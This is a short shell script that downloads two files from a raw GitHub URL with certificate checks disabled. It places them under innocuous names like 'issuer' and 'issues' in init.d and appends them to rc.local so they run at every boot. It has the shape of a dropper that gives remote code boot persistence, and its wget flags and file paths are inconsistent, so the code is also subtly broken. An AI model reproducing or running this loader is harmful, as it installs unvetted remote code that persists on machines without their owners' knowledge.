#!/bin/sh
#use: 
#chmod +x /etc/rc.d/rc.local
file1="/etc/rc.d/init.d/issuer"
file2="/etc/rc.d/init.d/issues.sh"
num1=$(ps -ef | grep issues | wc -l)
url1="https://raw.githubusercontent.com/0x594/test/main/issues"
url2="https://raw.githubusercontent.com/0x594/test/main/issues.sh"
if [ ! -f "$file1" ]; then
  wget -P "$file1" --no-check-certificate $url1 -O issues
  wget -P "$file2" --no-check-certificate $url2 -O issues.sh
  chmod a+x /etc/rc.d/init.d/issuer
fi
if [ `grep -c "issues" /etc/rc.d/rc.local` -eq '0' ]; then
    echo "/etc/rc.d/init.d/issues" >> /etc/rc.d/rc.local
	echo "/etc/rc.d/init.d/issues.sh" >> /etc/rc.d/rc.local
	chmod +x /etc/rc.d/rc.local
fi

